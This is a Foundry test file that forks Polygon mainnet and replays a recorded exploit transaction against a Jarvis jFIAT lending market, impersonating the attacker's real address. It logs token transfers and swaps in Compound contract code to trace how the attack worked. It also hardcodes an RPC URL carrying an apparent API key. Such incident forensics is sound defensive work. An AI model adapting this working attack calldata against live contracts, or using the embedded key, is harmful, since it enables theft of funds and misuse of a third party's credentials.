// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/HookMe.sol";
import {CErc20Delegator} from "src/CErc20Delegator/contracts/compound/CErc20Delegator.sol";
import {CErc20Delegate} from "src/CErc20Delegate/contracts/compound/CErc20Delegate.sol";
import {Unitroller} from "src/Unitroller/src/Unitroller.sol";
import {Comptroller} from "src/Comptroller/src/Comptroller.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";

contract ExploitTest is Test {

    address constant exploit_contract = 0x757E9F49aCfAB73C25b20D168603d54a66C723A1;
    address constant exploit_eoa = 0x1863b74778cf5e1C9C482a1cDc2351362bD08611;
    address constant jarvis_jfiat_token = 0x7ADf374Fa8b636420D41356b1f714F18228e7ae2;
    address constant jarvis_jfiat_token_impl = 0xef193a68214AE84d30a9D9A1355C86714Cb7Bfad;
    address constant unitroller_address = 0xD265ff7e5487E9DD556a4BB900ccA6D087Eb3AD2;
    address constant comptroller_address = 0xC6E52A148512c8EcD88ddC4f4E0A0F005C78Bf70;

    bytes32 constant event_transfer_signature = 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;

    IERC20 wmatic = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 usdc = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 jgbp = IERC20(0x767058F11800FBA6A682E73A6e79ec5eB74Fac8c);

    HookMe hookMe;
    CErc20Delegator cErc20Delegator;
    CErc20Delegate cErc20Delegate;
    Unitroller unitroller;
    Comptroller comptroller;

    function setUp() public {
        uint256 mainnetFork = vm.createFork(
            "https://capable-icy-friday.matic.discover.quiknode.pro/c7f1edba46722398979bea68e274c8038531948c/",
            38118348-1
        );
        vm.selectFork(mainnetFork);
        assertEq(block.number, 38118348-1);

        hookMe = new HookMe();
        cErc20Delegator = new CErc20Delegator();
        cErc20Delegate = new CErc20Delegate();
        unitroller = new Unitroller();
        comptroller = new Comptroller();

        vm.label(exploit_eoa, "exploit_eoa");
        vm.label(exploit_contract, "exploit_contract");
        vm.label(address(wmatic), "wmatic");
        vm.label(address(usdc), "usdc");
        vm.label(address(jgbp), "jGBP");
        vm.label(jarvis_jfiat_token, "jarvis_jfiat_token");
    }

    function testListAllTokensInvolved() public {
        bytes memory cdata = hex"bbc1ef7a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184b714b7938593341596e37417a65473772375656785137340000000000000000";
        vm.prank(exploit_eoa);
        vm.recordLogs();
        (bool success, ) = exploit_contract.call(cdata);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        for (uint i = 0; i < entries.length; i++) {
            Vm.Log memory entry = entries[i];
            if (entry.topics[0] == event_transfer_signature) {
                console.log("%x", uint256(uint160(entry.emitter)));
            }
        }
    }

    function testJGBP() public {
        bytes memory cdata = hex"bbc1ef7a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184b714b7938593341596e37417a65473772375656785137340000000000000000";
        vm.prank(exploit_eoa);
        vm.recordLogs();
        (bool success, ) = exploit_contract.call(cdata);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        for (uint i = 0; i < entries.length; i++) {
            Vm.Log memory entry = entries[i];
            if (entry.topics[0] == event_transfer_signature && entry.emitter == address(jgbp)) {
                console.log("%x --> %x (%d)", uint256((entry.topics[1])), uint256((entry.topics[2])), uint256(bytes32(entry.data)));
            }
        }
    }

    function testJGBP2() public {
        bytes memory cdata = hex"bbc1ef7a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184b714b7938593341596e37417a65473772375656785137340000000000000000";
        vm.prank(exploit_eoa);
        vm.recordLogs();
        (bool success, ) = exploit_contract.call(cdata);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        for (uint i = 0; i < entries.length; i++) {
            Vm.Log memory entry = entries[i];
            if (entry.topics[0] == event_transfer_signature) {
                address from = address(uint160(uint256((entry.topics[1]))));
                address to = address(uint160(uint256((entry.topics[2]))));
                uint256 amount = uint256(bytes32(entry.data));
                if (from == jarvis_jfiat_token || to == jarvis_jfiat_token) {
                    console.log("[%x] %x --> %x", uint160(entry.emitter), uint160(from), uint160(to));
                }
            }
        }
    }

    function testJGBP3() public {
        vm.etch(jarvis_jfiat_token, address(cErc20Delegator).code);
        bytes memory cdata = hex"bbc1ef7a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184b714b7938593341596e37417a65473772375656785137340000000000000000";
        vm.prank(exploit_eoa);
        (bool success, ) = exploit_contract.call(cdata);
    }

    function testJGBP4() public {
        vm.etch(jarvis_jfiat_token_impl, address(cErc20Delegate).code);
        //vm.etch(comptroller_address, address(comptroller).code);
        bytes memory cdata = hex"bbc1ef7a000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000184b714b7938593341596e37417a65473772375656785137340000000000000000";
        vm.prank(exploit_eoa);
        (bool success, ) = exploit_contract.call(cdata);
        console.log("exp: %d", exploit_contract.balance);
    }
}
